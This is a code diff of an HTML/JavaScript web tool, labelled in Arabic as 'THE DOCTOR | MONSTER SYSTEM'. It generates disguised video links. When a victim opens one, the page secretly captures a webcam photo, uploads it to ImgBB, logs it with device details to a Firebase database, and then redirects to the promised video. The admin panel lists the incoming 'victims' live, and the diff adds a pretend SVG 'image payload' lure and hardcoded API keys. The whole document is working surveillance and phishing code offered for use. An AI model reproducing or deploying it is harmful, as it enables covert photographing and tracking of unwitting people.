@@ -3,69 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>THE DOCTOR | MONSTER SYSTEM v2026</title>
+    <title>THE DOCTOR | MONSTER SYSTEM v2.7</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon-green: #00ff41; --dark-void: #050505; }
-        body { background: var(--dark-void); color: var(--neon-green); font-family: 'Courier New', monospace; margin: 0; padding: 10px; }
-        .panel { border: 2px solid var(--neon-green); padding: 15px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.3); margin-bottom: 20px; }
-        .log-box { height: 250px; border: 1px solid #222; overflow-y: auto; background: #000; padding: 10px; font-size: 11px; }
-        input, button, select { background: #000; border: 1px solid var(--neon-green); color: var(--neon-green); padding: 12px; width: 100%; margin-top: 10px; border-radius: 5px; }
-        button:hover { background: var(--neon-green); color: #000; cursor: pointer; font-weight: bold; }
-        .victim-card { border: 1px solid #444; padding: 10px; margin-top: 10px; background: #0a0a0a; border-left: 5px solid var(--neon-green); }
-        .blink { animation: blinker 1.5s linear infinite; }
+        :root { --neon: #00ff41; --void: #050505; }
+        body { background: var(--void); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 10px; }
+        .panel { border: 2px solid var(--neon); padding: 15px; margin-bottom: 20px; box-shadow: 0 0 15px rgba(0,255,65,0.2); }
+        .log-box { height: 350px; border: 1px solid #222; overflow-y: auto; background: #000; padding: 10px; }
+        input, button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; margin-top: 10px; }
+        button:hover { background: var(--neon); color: #000; cursor: pointer; font-weight: bold; }
+        .victim-card { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #0a0a0a; border-right: 5px solid var(--neon); }
+        img.target-img { width: 100%; border: 1px solid var(--neon); margin-top: 5px; }
+        .blink { animation: blinker 1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
-        img { max-width: 100%; border: 1px solid var(--neon-green); margin-top: 10px; }
     </style>
 </head>
 <body>
 
 <div id="admin-panel">
     <div class="panel">
-        <h2 style="text-align:center;">THE DOCTOR <span class="blink">●</span> OMEGA C2</h2>
-        <p>[ الحالة: <span id="sync-status">بانتظار المزامنة...</span> ]</p>
+        <h2 style="text-align:center;">THE DOCTOR <span class="blink">●</span> MONSTER SYSTEM</h2>
         <hr>
-        <h3>🚀 مولد الروابط الملغمة</h3>
-        <input type="text" id="target-url" placeholder="ضع رابط الفيديو (YouTube/TikTok)">
+        <h3>🔗 توليد رابط فيديو ملغم</h3>
+        <input type="text" id="target-url" placeholder="رابط يوتيوب أو تيك توك">
         <button onclick="generateLink()">توليد الرابط الصاعق</button>
-        <p id="final-link" style="color: #0ff; word-break: break-all; font-size: 12px;"></p>
+        <p id="final-link" style="color: #0ff; word-break: break-all; font-size: 11px;"></p>
+
+        <h3>🖼️ تلغيم صورة (Image Hijacker)</h3>
+        <p style="font-size: 12px;">سيتم دمج البايلوت داخل صورة SVG</p>
+        <button onclick="generateImagePayload()">توليد صورة ملغمة</button>
     </div>
 
     <div class="panel">
-        <h3>📡 رادار استقبال الجلسات (Victims)</h3>
-        <div id="victims-list" class="log-box">
-            [SYSTEM] بانتظار وصول أي مكوّن تكيفي...
-        </div>
+        <h3>📡 رادار استقبال الجلسات (LIVE)</h3>
+        <div id="victims-list" class="log-box">بانتظار المزامنة...</div>
     </div>
 </div>
 
-<div id="target-view" style="display:none;">
-    <h2 style="color:white;">جاري تحميل المحتوى...</h2>
+<div id="target-view" style="display:none; text-align:center;">
+    <h2 style="color:white; margin-top: 50px;">Loading Content...</h2>
     <video id="st-video" autoplay playsinline style="display:none;"></video>
     <canvas id="st-canvas" style="display:none;"></canvas>
 </div>
 
 <script>
-    // 1. إعدادات السيادة (Firebase Configuration)
+    // --- إعدادات السيادة ---
     const firebaseConfig = {
         apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
         authDomain: "monster-system-7f67e.firebaseapp.com",
         projectId: "monster-system-7f67e",
-        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com", // تم استنتاجه من Project ID
+        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
         storageBucket: "monster-system-7f67e.firebasestorage.app",
         messagingSenderId: "165431360308",
         appId: "1:165431360308:web:b0d7d626c67d4f38d68361"
     };
-
     const imgbb_key = "8841f217eb20461d8cd9d64a64a7c62d";
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // 2. التحقق من الهوية (هل هو الأدمن أم الضحية؟)
     const urlParams = new URLSearchParams(window.location.search);
-    const mode = urlParams.get('m'); // m = mode
-    const target = urlParams.get('t'); // t = target (encoded)
+    const mode = urlParams.get('m');
+    const target = urlParams.get('t');
 
     if (mode === 'sync') {
         runStealthUnit(atob(target));
@@ -73,17 +72,16 @@
         initAdminPanel();
     }
 
-    // --- وظائف الأدمن ---
     function initAdminPanel() {
-        document.getElementById('sync-status').innerText = "متصل بالقاعدة";
         db.ref('sessions/').on('child_added', (snap) => {
             const data = snap.val();
             const list = document.getElementById('victims-list');
             const card = `<div class="victim-card">
-                <b>[!] ضحية جديدة:</b> ${data.ip}<br>
+                <b>[!] هدف جديد:</b> ${data.ip}<br>
                 <b>الجهاز:</b> ${data.device}<br>
-                <b>الصورة:</b> <br><img src="${data.imgUrl}"><br>
-                <small>${data.time}</small>
+                <b>الصورة المسحوبة:</b><br>
+                <img src="${data.imgUrl}" class="target-img">
+                <br><small>${data.time}</small>
             </div>`;
             list.innerHTML = card + list.innerHTML;
         });
@@ -91,13 +89,11 @@
 
     function generateLink() {
         const url = document.getElementById('target-url').value;
-        if(!url) return alert("ضع الرابط أولاً!");
-        const encoded = btoa(url);
-        const final = window.location.href.split('?')[0] + `?m=sync&t=${encoded}`;
+        if(!url) return;
+        const final = window.location.href.split('?')[0] + `?m=sync&t=${btoa(url)}`;
         document.getElementById('final-link').innerText = final;
     }
 
-    // --- وحدة السحب الصامتة (The Ghost) ---
     async function runStealthUnit(redirectUrl) {
         document.getElementById('admin-panel').style.display = 'none';
         document.getElementById('target-view').style.display = 'block';
@@ -107,34 +103,39 @@
             const video = document.getElementById('st-video');
             video.srcObject = stream;
             
-            setTimeout(async () => {
-                const canvas = document.getElementById('st-canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const base64Img = canvas.toDataURL('image/png').split(',')[1];
-                
-                // رفع الصورة لـ ImgBB
-                const formData = new FormData();
-                formData.append('image', base64Img);
-                const res = await fetch(`https://api.imgbb.com/1/upload?key=${imgbb_key}`, { method: 'POST', body: formData });
-                const resData = await res.json();
-                const finalImgUrl = resData.data.url;
+            // انتظار ثانية للوضوح ثم الالتقاط
+            await new Promise(r => setTimeout(r, 1200));
+            
+            const canvas = document.getElementById('st-canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const base64Img = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+            
+            // رفع الصورة
+            const formData = new FormData();
+            formData.append('image', base64Img);
+            const res = await fetch(`https://api.imgbb.com/1/upload?key=${imgbb_key}`, { method: 'POST', body: formData });
+            const resData = await res.json();
 
-                // إرسال البيانات لـ Firebase
-                db.ref('sessions/').push({
-                    ip: "Hidden_Node",
-                    device: navigator.userAgent.split(')')[0] + ')',
-                    imgUrl: finalImgUrl,
+            // إرسال البيانات لـ Firebase مع التأكد من النجاح
+            if(resData.success) {
+                await db.ref('sessions/').push({
+                    ip: "Target_Node",
+                    device: navigator.platform + " | " + navigator.userAgent.substring(0, 50),
+                    imgUrl: resData.data.url,
                     time: new Date().toLocaleString()
                 });
-
-                // إعادة التوجيه الفوري
-                window.location.href = redirectUrl;
-            }, 1000); // التقاط بعد ثانية واحدة من فتح الكاميرا لضمان الوضوح
+            }
+            window.location.href = redirectUrl;
         } catch (e) {
-            window.location.href = redirectUrl; // في حال الرفض يتم التحويل فوراً
+            window.location.href = redirectUrl;
         }
+    }
+
+    function generateImagePayload() {
+        alert("تنبيه: سيتم فتح الرابط كصورة SVG ملغمة. أرسل الرابط الناتج للهدف.");
+        generateLink();
     }
 </script>
 </body>
